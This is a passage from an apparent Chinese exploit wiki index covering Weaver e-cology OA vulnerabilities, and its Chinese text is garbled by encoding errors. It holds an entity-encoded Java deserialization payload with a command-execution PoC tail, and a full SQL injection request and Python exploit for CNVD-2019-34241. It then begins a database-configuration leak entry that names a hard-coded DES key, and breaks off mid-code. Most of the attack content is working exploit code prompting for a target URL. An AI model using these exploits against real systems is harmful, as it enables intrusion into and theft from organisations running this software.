&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x67;&#x6e;&#x6f;&#x72;&#x65;&#x64;&#x5f;&#x5f;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x6a;&#x61;&#x76;&#x61;&#x78;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x73;&#x75;&#x6e;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x67;&#x6e;&#x6f;&#x72;&#x65;&#x64;&#x5f;&#x5f;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x72;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x53;&#x79;&#x6e;&#x74;&#x68;&#x65;&#x74;&#x69;&#x63;&#x52;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x74;&#x68;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x2e;&#x3c;&#x2f;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x5f;&#x5f;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x64;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x72;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x65;&#x72;&#x54;&#x6f;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x73;&#x75;&#x6e;&#x2e;&#x6d;&#x69;&#x73;&#x63;&#x2e;&#x4c;&#x61;&#x75;&#x6e;&#x63;&#x68;&#x65;&#x72;&#x24;&#x45;&#x78;&#x74;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x70;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x6f;&#x72;&#x43;&#x4c;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x74;&#x79;&#x70;&#x65;&#x3e;&#x4b;&#x45;&#x59;&#x53;&#x3c;&#x2f;&#x74;&#x79;&#x70;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x6e;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x42;&#x79;&#x74;&#x65;&#x41;&#x72;&#x72;&#x61;&#x79;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x62;&#x75;&#x66;&#x3e;&#x3c;&#x2f;&#x62;&#x75;&#x66;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x6f;&#x73;&#x3e;&#x30;&#x3c;&#x2f;&#x70;&#x6f;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6d;&#x61;&#x72;&#x6b;&#x3e;&#x30;&#x3c;&#x2f;&#x6d;&#x61;&#x72;&#x6b;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x30;&#x3c;&#x2f;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6e;&#x73;&#x75;&#x6d;&#x65;&#x64;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x63;&#x6f;&#x6e;&#x73;&#x75;&#x6d;&#x65;&#x64;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x74;&#x72;&#x61;&#x6e;&#x73;&#x66;&#x65;&#x72;&#x46;&#x6c;&#x61;&#x76;&#x6f;&#x72;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x48;&#x61;&#x6e;&#x64;&#x6c;&#x65;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x4c;&#x65;&#x6e;&#x3e;&#x30;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x4c;&#x65;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e;&#x0a;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e; 2 '''.format(cmd=cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) if \"VulTest\" in response.text and response.status_code == 500: print(\"\\033[36m[o] å­˜åœ¨æ¼æ´ \\n[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:44:40 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥.html","title":"æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥(ä»…é™oracleæ•°æ®åº“)","keywords":"","body":"æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥(ä»…é™oracleæ•°æ®åº“) CNVD-2019-34241 æ¼æ´æè¿° 2019å¹´10æœˆ10æ—¥CNVDå‘å¸ƒäº†æ³›å¾®e-cology OAç³»ç»Ÿå­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºOAç³»ç»Ÿçš„WorkflowCenterTreeDataæ¥å£ä¸­æ¶‰åŠOracleæ•°æ®åº“çš„SQLè¯­å¥ç¼ºä¹å®‰å…¨æ£€æŸ¥æªæ–½æ‰€å¯¼è‡´çš„ï¼Œä»»æ„æ”»å‡»è€…éƒ½å¯å€ŸSQLè¯­å¥æ‹¼æ¥æ—¶æœºæ³¨å…¥æ¶æ„payloadï¼Œé€ æˆSQLæ³¨å…¥æ”»å‡»ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] ä½¿ç”¨Oracleæ•°æ®åº“çš„æ³›å¾®æœåŠ¡ æ¼æ´å¤ç° æ³›å‹å¾®ç”Ÿæ€OAç³»ç»Ÿçš„WorkflowCenterTreeDataæ¥å£åœ¨ä½¿ç”¨Oracleæ•°æ®åº“æ—¶ï¼Œç”±äºå†…ç½®sqlè¯­å¥åˆ†è§£ä¸ä¸¥å¯†ï¼Œå¯¼è‡´å…¶å­˜åœ¨çš„sqlæ³¨å…¥æ¼æ´ æ¼æ´è¯·æ±‚åŒ… POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 æ¼æ´åˆ©ç”¨POCF import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url): target=url+'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333' payload=\"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1\" res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '__main__': url=sys.argv[1] exploit(url) å‚è€ƒæ–‡ç«  æ³›å¾®OA WorkflowCenterTreeDataæ¥å£æ³¨å…¥å¤ç°ï¼ˆä»…é™oracleæ•°æ®åº“ï¼‰ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 18:59:19 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´.html","title":"æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´","keywords":"","body":"æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´ æ¼æ´æè¿° 2019å¹´10æœˆ24æ—¥ï¼Œ360CERTç›‘æµ‹åˆ°å‹å•†å‘å¸ƒäº†æ³›å¾®e-cology OAæ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´é¢„è­¦ï¼Œæ¼æ´ç­‰çº§ä¸­ã€‚ æ”»å‡»è€…å¯é€šè¿‡å­˜åœ¨æ¼æ´çš„é¡µé¢ç›´æ¥è·å–åˆ°æ•°æ®åº“é…ç½®ä¿¡æ¯ã€‚å¦‚æœæ”»å‡»è€…å¯ç›´æ¥è®¿é—®æ•°æ®åº“ï¼Œåˆ™å¯ç›´æ¥è·å–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³å¯ä»¥ç›´æ¥æ§åˆ¶æ•°æ®åº“æœåŠ¡å™¨ã€‚ 360CERTåˆ¤æ–­æ¼æ´ç­‰çº§ä¸ºä¸­ï¼Œå±å®³é¢/å½±å“é¢ä½ã€‚å»ºè®®ä½¿ç”¨æ³›å¾®e-cology OAçš„ç”¨æˆ·åŠæ—¶å®‰è£…æœ€æ–°è¡¥ä¸ï¼Œä»¥å…é­å—é»‘å®¢æ”»å‡»ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] ç›®å‰å·²çŸ¥ä¸º8.100.0531,ä¸æ’é™¤å…¶ä»–ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬ä¸é™äºEC7.0ã€EC8.0ã€EC9.0ç‰ˆ æ¼æ´å¤ç° æ ¹æ®æºç å¯ä»¥å¾—åˆ°DESå¯†é’¥ä¸º 1z2x3c4v5b6nï¼ˆä¹Ÿæœ‰1z2x3c4vçš„,å¯ä»¥æŒ‰æ­¤è§„å¾‹æ¥çˆ†ç ´ï¼‰ å¯ä»¥çœ‹åˆ°ä¼šå°†å½“å‰è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·åå¯†ç ï¼Œurlï¼Œlogintypeç­‰ä¿¡æ¯è¿›è¡ŒdesåŠ å¯†ï¼Œå¹¶æœ€ç»ˆè¿›è¡Œè¿”å›ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡desè§£å¯†è·å–æ³„éœ²ä¿¡æ¯ã€‚ æ¼æ´åˆ©ç”¨POC Githubé“¾æ¥ pythonä»£ç  import base64 import requests import ast def 